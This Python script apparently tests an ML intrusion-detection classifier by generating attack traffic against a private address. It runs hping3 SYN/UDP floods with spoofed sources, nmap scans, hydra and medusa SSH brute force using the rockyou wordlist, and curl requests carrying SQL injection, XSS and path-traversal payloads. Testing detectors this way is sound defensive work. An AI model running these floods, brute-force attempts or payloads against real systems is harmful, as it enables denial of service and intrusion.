#!/usr/bin/env python3
"""
Quick test to generate specific attack patterns and verify ML classification
"""

import time
import subprocess
import threading
from datetime import datetime

def run_command(cmd, description):
    """Run a command and show status"""
    print(f"🔧 {description}")
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            print(f"✅ {description} - Success")
            return True
        else:
            print(f"❌ {description} - Failed: {result.stderr}")
            return False
    except subprocess.TimeoutExpired:
        print(f"⏱️ {description} - Timeout")
        return False

def test_ddos_pattern():
    """Generate DDoS-like traffic pattern"""
    print("\n🚨 Testing DDoS Pattern Recognition")
    
    # Multiple rapid SYN packets from different sources
    commands = [
        "hping3 -S -p 80 --flood --rand-source 192.168.254.1",
        "hping3 -S -p 443 --flood --rand-source 192.168.254.1", 
        "hping3 -U -p 53 --flood --rand-source 192.168.254.1"
    ]
    
    for cmd in commands:
        print(f"Executing: {cmd}")
        # Run for 5 seconds then kill
        proc = subprocess.Popen(cmd, shell=True)
        time.sleep(5)
        proc.terminate()
        time.sleep(1)

def test_port_scan_pattern():
    """Generate port scan pattern"""
    print("\n🔍 Testing Port Scan Pattern Recognition")
    
    # Nmap-style port scan
    commands = [
        "nmap -sS -F 192.168.254.1",  # Fast SYN scan
        "nmap -sU --top-ports 100 192.168.254.1",  # UDP scan
        "nmap -sV -p 22,80,443 192.168.254.1"  # Service detection
    ]
    
    for cmd in commands:
        run_command(cmd, f"Port scan: {cmd}")
        time.sleep(2)

def test_brute_force_pattern():
    """Generate brute force pattern"""
    print("\n🔓 Testing Brute Force Pattern Recognition")
    
    # SSH brute force simulation
    commands = [
        "hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.254.1 -t 1 -W 10",
        "medusa -h 192.168.254.1 -u admin -P /usr/share/wordlists/rockyou.txt.gz -M ssh -t 1 -T 5"
    ]
    
    for cmd in commands:
        run_command(cmd, f"Brute force: {cmd.split()[0]}")

def test_web_attack_pattern():
    """Generate web attack pattern"""
    print("\n🌐 Testing Web Attack Pattern Recognition")
    
    # Web application attacks
    payloads = [
        "' OR '1'='1",
        "<script>alert('XSS')</script>",
        "../../../etc/passwd",
        "'; DROP TABLE users; --"
    ]
    
    for payload in payloads:
        cmd = f"curl -s 'http://192.168.254.1/test.php?id={payload}'"
        run_command(cmd, f"Web attack payload: {payload[:20]}...")
        time.sleep(1)

def monitor_ml_output():
    """Monitor ML classification output"""
    print("\n📊 Monitoring ML Classifications...")
    
    # Start ML consumer in background
    ml_proc = subprocess.Popen(
        ["python3", "ml_alert_consumer.py"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    return ml_proc

def main():
    print("🎯 CICIDS2017 ML Classification Test")
    print("=" * 50)
    
    # Check prerequisites
    print("🔧 Checking prerequisites...")
    
    # Install required tools if needed
    tools = {
        "hping3": "sudo apt-get install -y hping3",
        "nmap": "sudo apt-get install -y nmap", 
        "hydra": "sudo apt-get install -y hydra",
        "curl": "sudo apt-get install -y curl"
    }
    
    for tool, install_cmd in tools.items():
        if subprocess.run(f"which {tool}", shell=True, capture_output=True).returncode != 0:
            print(f"Installing {tool}...")
            subprocess.run(install_cmd, shell=True)
    
    # Start ML monitoring
    ml_proc = monitor_ml_output()
    
    try:
        # Run attack pattern tests
        test_ddos_pattern()
        time.sleep(5)
        
        test_port_scan_pattern() 
        time.sleep(5)
        
        test_brute_force_pattern()
        time.sleep(5)
        
        test_web_attack_pattern()
        time.sleep(5)
        
        print("\n✅ All attack patterns generated!")
        print("Check ML output for different classifications...")
        
        # Wait for ML processing
        time.sleep(10)
        
    finally:
        # Cleanup
        ml_proc.terminate()
        print("\n🛑 Test completed")

if __name__ == "__main__":
    main()